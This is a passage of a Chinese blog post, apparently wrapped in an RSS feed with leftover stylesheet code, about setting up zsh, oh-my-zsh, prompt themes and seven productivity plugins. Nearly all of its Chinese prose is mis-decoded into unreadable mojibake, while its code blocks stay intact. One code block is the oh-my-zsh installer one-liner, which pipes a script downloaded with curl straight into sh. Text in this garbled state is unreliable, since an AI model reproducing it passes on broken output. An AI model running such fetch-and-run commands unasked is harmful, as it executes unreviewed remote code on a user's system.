12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç»ˆç«¯ç¯å¢ƒï¼šzshã€oh-my-zshã€æç¤ºä¸»é¢˜ä¸ 7 ä¸ªæ•ˆç‡æ’ä»¶</h2>
<p>æœ¬æ–‡ä¸»è¦ä»‹ç»å¦‚ä½•æ„å»ºä¸€ä¸ªé«˜æ•ˆçš„ç»ˆç«¯ç¯å¢ƒï¼ŒåŒ…æ‹¬ zsh ä¸ bash çš„å¯¹æ¯”ã€zsh çš„å®‰è£…ã€oh-my-zsh æ¡†æ¶çš„ä½¿ç”¨ä¸ä¸»é¢˜é…ç½®ï¼Œä»¥åŠ 7 ä¸ªå®ç”¨æ’ä»¶ï¼ˆå« 5 ä¸ªå†…ç½®æ’ä»¶ + 2 ä¸ªç¤¾åŒºæ’ä»¶ï¼‰ï¼Œæå‡å‘½ä»¤è¡Œæ•ˆç‡ã€‚</p>
<hr/>
<h3 data-id="heading-1">1. ä¸ºä»€ä¹ˆä½¿ç”¨ zshï¼Ÿ</h3>
<p>zshï¼ˆZ Shellï¼‰æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ shellï¼Œç›¸è¾ƒ bash æœ‰ä»¥ä¸‹ä¼˜åŠ¿ï¼š:</p>
<ul>
<li><strong>æ›´å¼ºçš„è‡ªåŠ¨è¡¥å…¨</strong>ï¼šä¸ä»…è¡¥å…¨å‘½ä»¤ï¼Œè¿˜èƒ½è¡¥å…¨å‚æ•°ã€é€‰é¡¹å’Œæ–‡ä»¶åï¼ŒåŒæ—¶å¯æ˜¾ç¤ºç®€çŸ­å¸®åŠ©æç¤ºã€‚</li>
<li><strong>æ›´å¥½çš„è„šæœ¬ä¸æ’ä»¶æ”¯æŒ</strong>ï¼šæ‹¥æœ‰æ´»è·ƒç¤¾åŒºå’Œä¸°å¯Œæ’ä»¶ç”Ÿæ€ï¼Œå¯å¤§å¹…å¢å¼º shell åŠŸèƒ½ã€‚</li>
<li><strong>ä¸»é¢˜ä¸æç¤ºç¬¦é«˜åº¦å¯å®šåˆ¶</strong>ï¼šè‡ªå®šä¹‰å‘½ä»¤è¡Œå¤–è§‚å’Œæ˜¾ç¤ºå†…å®¹ï¼ˆå¦‚ Git åˆ†æ”¯ã€ç¯å¢ƒä¿¡æ¯ç­‰ï¼‰ã€‚</li>
<li><strong>æ™ºèƒ½äº¤äº’ä½“éªŒ</strong>ï¼šæ”¯æŒæ‹¼å†™çº æ­£ä¸è¿‘ä¼¼å®Œæˆç­‰åŠŸèƒ½ï¼Œæé«˜ä½¿ç”¨ä¾¿æ·æ€§ã€‚</li>
<li><strong>å¢å¼ºæ–‡ä»¶åŒ¹é…åŠé…ç½®çµæ´»æ€§</strong>ï¼šæ”¯æŒæ‰©å±•é€šé…ç¬¦å’Œå†å²å…±äº«ç­‰é«˜çº§ç‰¹æ€§ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-2">2. å®‰è£… zsh</h3>
<p>åœ¨ä¸åŒæ“ä½œç³»ç»Ÿä¸‹å®‰è£… zsh çš„æ–¹å¼å„ä¸ç›¸åŒï¼Œå¸¸è§å‘½ä»¤ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Debian / Ubuntu</span>
apt install zsh

<span class="hljs-comment"># CentOS</span>
yum install -y zsh

<span class="hljs-comment"># Arch</span>
pacman -S zsh

<span class="hljs-comment"># Fedora</span>
dnf install zsh
</code></pre>
<p>macOS è‡ª 2019 èµ·é»˜è®¤ä½¿ç”¨ zshï¼Œæ— éœ€æ‰‹åŠ¨å®‰è£…ã€‚è‹¥éœ€è¦å®‰è£…æˆ–æ›´æ–°ï¼Œå¯ä½¿ç”¨ <code>brew install zsh</code>ã€‚å®‰è£…åï¼Œç”¨ <code>chsh -s /bin/zsh</code> å°† zsh è®¾ç½®ä¸ºé»˜è®¤ shellã€‚</p>
<hr/>
<h3 data-id="heading-3">3. oh-my-zsh æ¡†æ¶</h3>
<p><strong>oh-my-zsh</strong> æ˜¯ä¸€ä¸ªç”¨äºç®¡ç† zsh é…ç½®çš„è½»é‡æ¡†æ¶ï¼Œå†…ç½®å¤§é‡ä¸»é¢˜ä¸æ’ä»¶ã€‚å®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">sh -c <span class="hljs-string">"<span class="hljs-subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>"</span>
</code></pre>
<p>å®‰è£…å®Œæˆåï¼Œå°†è‡ªåŠ¨å¯ç”¨åŸºç¡€ä¸»é¢˜ä¸æ’ä»¶ã€‚å¯é€šè¿‡ç¼–è¾‘ <code>~/.zshrc</code> æ¥æ›´æ”¹ä¸»é¢˜å’Œæ’ä»¶é…ç½®ã€‚</p>
<hr/>
<h3 data-id="heading-4">4. ä¸»é¢˜é…ç½®</h3>
<p>oh-my-zsh å†…ç½®äº†å¤šä¸ªæç¤ºç¬¦ä¸»é¢˜ï¼Œå¯åœ¨ <code>~/.zshrc</code> ä¸­æ›´æ”¹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">ZSH_THEME</span>=<span class="hljs-string">"agnoster"</span>
</code></pre>
<p>ä¹Ÿå¯å°† <code>ZSH_THEME</code> è®¾ç½®ä¸º <code>random</code>ï¼Œéšæœºé€‰å–ä¸»é¢˜ã€‚</p>
<hr/>
<h3 data-id="heading-5">5. å†…ç½®æ’ä»¶ï¼ˆ5 ä¸ªï¼‰</h3>
<h4 data-id="heading-6">æ’ä»¶å¯ç”¨æ–¹å¼</h4>
<p>åœ¨ <code>~/.zshrc</code> ä¸­æŒ‡å®šï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">plugins</span>=(git web-search jsontools z vi-mode)
</code></pre>
<h4 data-id="heading-7">æ’ä»¶ä»‹ç»</h4>
<ol>
<li><strong>git</strong> â€“ æä¾›å¸¸ç”¨ Git å‘½ä»¤åˆ«åï¼Œæé«˜æ“ä½œæ•ˆç‡ã€‚</li>
<li><strong>web-search</strong> â€“ åœ¨ç»ˆç«¯ç›´æ¥æ‰“å¼€æµè§ˆå™¨å¹¶æ‰§è¡Œæœç´¢ã€‚</li>
<li><strong>jsontools</strong> â€“ æä¾› JSON æ ¼å¼åŒ–ç­‰åŸºæœ¬å¤„ç†å·¥å…·ã€‚</li>
<li><strong>z</strong> â€“ åŸºäºå†å²è®¿é—®ç›®å½•çš„å¿«é€Ÿè·³è½¬å·¥å…·ã€‚</li>
<li><strong>vi-mode</strong> â€“ å…è®¸ä½¿ç”¨ vi é”®ç›˜æ¨¡å¼ç¼–è¾‘å‘½ä»¤è¡Œã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-8">6. ç¤¾åŒºæ’ä»¶ï¼ˆ2 ä¸ªï¼‰</h3>
<p>è¿™ä¸¤æ¬¾æ’ä»¶éœ€è¦ä» GitHub ä¸‹è½½å¹¶é…ç½®åˆ° oh-my-zshï¼š</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="hljs-variable">${ZSH_CUSTOM:-<span class="hljs-variable">$HOME</span>/.oh-my-zsh/custom}</span>/plugins/zsh-autosuggestions
git <span class="hljs-built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting <span class="hljs-variable">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-syntax-highlighting
</code></pre>
<p>å¹¶å°†å…¶åŠ å…¥æ’ä»¶åˆ—è¡¨ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">plugins</span>=(... zsh-syntax-highlighting zsh-autosuggestions)
</code></pre>
<h4 data-id="heading-9">æ’ä»¶è¯¦æƒ…</h4>
<ul>
<li><strong>zsh-syntax-highlighting</strong>ï¼šæä¾›å‘½ä»¤å®æ—¶è¯­æ³•é«˜äº®ï¼Œè¯­æ³•é”™è¯¯æ—¶ä»¥ä¸åŒé¢œè‰²æç¤ºã€‚</li>
<li><strong>zsh-autosuggestions</strong>ï¼šæ ¹æ®å†å²å‘½ä»¤å’Œè¡¥å…¨æç¤ºæä¾›æ™ºèƒ½å»ºè®®ï¼Œå¯é€šè¿‡è‡ªå®šä¹‰å¿«æ·é”®ï¼ˆå¦‚ <code>Tab</code>ï¼‰æ¥æ¥å—å»ºè®®ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-10">7. æ€»ç»“</h3>
<p>ä¸€èˆ¬ä»¥ä¸Šæ’ä»¶åŸºæœ¬æ»¡è¶³99%çš„åœºæ™¯ä½¿ç”¨ï¼Œå¦‚æœå…¶å®ƒæ¨èæ¬¢è¿è¡¥å……ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>